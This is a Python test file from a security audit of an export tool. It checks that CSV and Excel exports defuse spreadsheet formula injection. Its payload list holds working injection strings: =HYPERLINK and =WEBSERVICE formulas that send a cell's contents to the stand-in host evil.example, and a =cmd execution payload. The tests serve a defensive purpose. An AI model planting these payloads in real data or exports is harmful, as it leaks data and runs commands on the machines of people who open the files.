# SPDX-License-Identifier: BUSL-1.1
# Copyright (c) 2024-2026 Ali Sadeghi Aghili
"""Finding 15 — exported cells are executed by Excel, not displayed by it.

Both export paths write result values straight through:

* ``exporters/excel_exporter.py`` -- ``df.to_excel(...)``
* ``webapp/agent.py`` -- ``csv.DictWriter`` with ``encoding="utf-8-sig"``,
  and the module docstring says why the BOM is there: *"so Excel"* opens it
  correctly. The file is built to be opened by the one program that treats
  a leading ``=`` as code.

Reproduced during the audit by seeding a warehouse row whose ``Name`` was
``=HYPERLINK("//evil/"&A1)`` and running the real Flask path. The exported
file contained, verbatim::

    Name
    Ali
    "=HYPERLINK(""//evil/""&A1)"

CSV quoting escaped the embedded quotes -- that is field quoting, and it
does nothing here. The cell still *begins* with ``=``, so Excel and
LibreOffice parse it as a formula on open.

Why this is not "the database's problem". The attacker needs no access to
this system at all. They need one text field, anywhere upstream, that ends
up in a table this tool can query -- a company name, a description, a note
typed into some other application years ago. This engine then faithfully
extracts it and packages it for Excel. The exchange's own data pipeline is
the delivery mechanism.

Two payload shapes matter and both are covered below: ``=cmd|...`` style
execution, and ``=HYPERLINK``/``=WEBSERVICE`` style exfiltration, which is
the nastier one because it renders as an ordinary-looking link and leaks a
neighbouring cell's contents when clicked.

The standard neutralisation is a leading apostrophe: Excel treats the cell
as text and does not display the apostrophe. It must be applied at the
export boundary, not in the database, because the database value is
correct -- it is only dangerous in this one file format.
"""

from __future__ import annotations

import csv
import sys
from pathlib import Path

import pandas as pd
import pytest

_REPO_ROOT = Path(__file__).resolve().parent.parent.parent
sys.path.insert(0, str(_REPO_ROOT))

#: Every character that starts a formula in Excel / LibreOffice / Sheets.
#: Tab and CR are included because leading whitespace is stripped before
#: the parser looks at the first significant character.
_DANGEROUS_PREFIXES = ["=", "+", "-", "@", "\t", "\r"]

_PAYLOADS = [
    '=HYPERLINK("//evil.example/"&A1,"Q4 report")',
    "=cmd|'/c calc'!A1",
    "+1+1",
    "-1+1",
    "@SUM(1+1)",
    "=WEBSERVICE(\"//evil.example/\"&A1)",
]


def _is_neutralised(cell: str) -> bool:
    """A cell is safe when a spreadsheet will not parse it as a formula."""
    return not any(str(cell).startswith(p) for p in _DANGEROUS_PREFIXES)


class TestTheSharedHelperExists:
    """One helper, used by both writers. Two copies of an escaping rule is
    one copy that gets fixed and one that does not -- the same reasoning
    that moved ``interpret_rows`` into ``llm/interpret.py``."""

    def test_a_neutralisation_helper_is_importable(self):
        from exporters.sanitize import defuse_formula  # noqa: F401

    @pytest.mark.parametrize("payload", _PAYLOADS)
    def test_it_neutralises_every_formula_prefix(self, payload):
        from exporters.sanitize import defuse_formula

        assert _is_neutralised(defuse_formula(payload)), (
            f"{payload!r} survives as a formula after defusing"
        )

    @pytest.mark.parametrize(
        "ordinary",
        ["Ali", "شرکت فولاد مبارکه", "1402", "12,000,000", "N/A", "", "a-b-c"],
    )
    def test_it_leaves_ordinary_values_untouched(self, ordinary):
        """A defence that mangles normal data gets removed by the first
        analyst who notices. Note ``a-b-c`` does *not* start with ``-``."""
        from exporters.sanitize import defuse_formula

        assert defuse_formula(ordinary) == ordinary, (
            f"{ordinary!r} was altered, and it was never dangerous"
        )

    def test_non_string_values_pass_through_unharmed(self):
        """Numbers and NULLs must stay numbers and NULLs -- turning a
        numeric column into text would break every downstream pivot."""
        from exporters.sanitize import defuse_formula

        assert defuse_formula(None) is None
        assert defuse_formula(42) == 42
        assert defuse_formula(3.5) == 3.5


class TestTheExcelExporterUsesIt:
    @pytest.mark.parametrize("payload", _PAYLOADS)
    def test_a_hostile_cell_is_neutralised_in_the_workbook(self, payload, tmp_path, monkeypatch):
        import exporters.excel_exporter as ex
        from openpyxl import load_workbook

        # The module reads settings through its own module-level name
        # precisely so a test can swap it -- see its comment on that line.
        monkeypatch.setattr(ex, "settings", type("S", (), {"export_dir": str(tmp_path)})())

        path = ex.export_excel(pd.DataFrame({"Name": ["Ali", payload]}))
        cells = [c.value for row in load_workbook(path).active.iter_rows() for c in row]
        hostile = [c for c in cells if isinstance(c, str) and not _is_neutralised(c)]
        assert not hostile, (
            f"the workbook contains a live formula cell: {hostile!r}. Opening "
            "it runs the payload on the analyst's workstation"
        )

    def test_ordinary_content_still_round_trips(self, tmp_path, monkeypatch):
        import exporters.excel_exporter as ex
        from openpyxl import load_workbook

        monkeypatch.setattr(ex, "settings", type("S", (), {"export_dir": str(tmp_path)})())
        path = ex.export_excel(pd.DataFrame({"Name": ["Ali"], "Total": [12000]}))
        values = [c.value for row in load_workbook(path).active.iter_rows() for c in row]
        assert "Ali" in values and 12000 in values, (
            "defusing changed values that were never dangerous"
        )


class TestTheCsvExporterUsesIt:
    """The path the audit actually reproduced, and the one written with a
    BOM specifically so Excel opens it."""

    @pytest.mark.parametrize("payload", _PAYLOADS)
    def test_a_hostile_cell_is_neutralised_in_the_csv(self, payload, tmp_path, monkeypatch):
        import webapp.agent as agent

        monkeypatch.setattr(agent, "OUTPUT_DIR", tmp_path)
        path = Path(agent._export_csv([{"Name": "Ali"}, {"Name": payload}]))

        with path.open(encoding="utf-8-sig", newline="") as fh:
            cells = [c for row in csv.reader(fh) for c in row]
        hostile = [c for c in cells if not _is_neutralised(c)]
        assert not hostile, (
            f"the CSV contains a live formula cell: {hostile!r}. This file is "
            "written with a BOM precisely so Excel opens it"
        )
